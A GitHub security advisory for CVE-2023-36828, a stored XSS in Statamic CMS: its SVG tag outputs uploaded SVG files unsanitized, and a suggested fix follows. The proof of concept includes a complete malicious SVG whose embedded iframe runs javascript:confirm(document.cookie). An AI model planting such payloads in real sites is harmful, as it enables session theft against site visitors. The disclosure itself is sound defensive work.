# [M] Statamic's Antlers sanitizer cannot effectively sanitize malicious SVG

## Summary
Severity: Medium
Advisory: GHSA-6r5g-cq4q-327g
CVE: CVE-2023-36828
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:L (CVSS_V3)
Published: 2023-07-06
Source: https://github.com/advisories/GHSA-6r5g-cq4q-327g
Type: github-advisory

## Affected
- Packagist: `statamic/cms` — affected >=0 <4.10.0

## Details
Antlers sanitizer cannot effectively sanitize malicious SVG

### Summary
The SVG tag does not sanitize malicious SVG. Therefore, an attacker can exploit this vulnerability to perform XSS attacks using SVG, even when using the `sanitize` function.

### Details
Regarding the previous discussion mentioned [here](https://github.com/statamic/cms/security/advisories/GHSA-jvw9-rrc5-39g6#advisory-comment-84322), it has been identified that the default blacklist in the **FilesFieldtypeController** (located at this [link](https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Http/Controllers/CP/Fieldtypes/FilesFieldtypeController.php#L15)) only blocks certain file extensions such as php, php3, php4, php5, and phtml. This allows a malicious user to upload a manipulated SVG file disguised as a social media icon, potentially triggering an XSS vulnerability.

### PoC Screenshot
![image](https://user-images.githubusercontent.com/17494868/251093022-15f949e9-2014-4069-850b-81940076745e.png)

### PoC
1. Create new Global set, let's say "Settings"
2. Create a "Grid" field in Blueprint (named: social), then add somefields Name (text), URL (text) and Icon (Assets) in the section Fields.
3. When calling the social setting in the `_footer.antlers.html`, remember to [sanitize](https://statamic.dev/modifiers/sanitize)
```
{{ settings:social }}
    <a href="{{ $url }}" class="ml-4" aria-label="{{ $name }}" rel="noopener">
        {{ svg :src="icon" class="h-6 w-6 hover:text-hot-pink" | sanitize }}
    </a>
{{ /settings:social }}
```
4. Upload the malicious SVG image, here is the code:
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
   <text x="20" y="35">Statamic</text>
   <foreignObject width="500" height="500">
            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:confirm(document.cookie);" width="400" height="250"/>
   </foreignObject>
</svg>
```



### Impact
Since the social media icon is displayed in the footer layout, any user can view it, potentially leading to the execution of XSS.

### Suggestions to Mitigate or Resolve the Issue:
Sanitize when outputing the svg. This vulnerability caused by unsanitized `File::get()` when retrieving the SVG, it is crucial to sanitize the SVG when outputting it. The issue can be found in the following file: https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Tags/Svg.php#L36-L40.

It is highly recommended to implement proper sanitization measures to ensure the security of the SVG content. One effective approach is to utilize a reliable package, such as https://github.com/darylldoyle/svg-sanitizer ,which provides comprehensive SVG sanitization capabilities.

So the code becomes:
```php
use enshrined\svgSanitize\Sanitizer;

if (File::exists($file)) {
                
    $sanitizer = new Sanitizer();
    $dirtySVG = File::get($file);

    $svg = $sanitizer->sanitize($dirtySVG);
    break;
}
```

### Reference
- https://github.com/gogs/gogs/security/advisories/GHSA-ff28-f46g-r9g8
- https://huntr.dev/bounties/34a12146-3a5d-4efc-a0f8-7a3ae04b198d/
- https://blog.nintechnet.com/wordpress-elementor-plugin-fixed-svg-xss-protection-bypass-vulnerability/

## References
- https://github.com/statamic/cms/security/advisories/GHSA-6r5g-cq4q-327g
- https://nvd.nist.gov/vuln/detail/CVE-2023-36828
- https://github.com/statamic/cms/pull/8408
- https://github.com/statamic/cms/commit/c714893ad92de6e5ede17b501003441af505b30d
- https://github.com/statamic/cms
- https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Http/Controllers/CP/Fieldtypes/FilesFieldtypeController.php#L15
- https://github.com/statamic/cms/blob/f806b6b007ddcf066082eef175653c5beaa96d60/src/Tags/Svg.php#L36-L40
- https://github.com/statamic/cms/releases/tag/v4.10.0
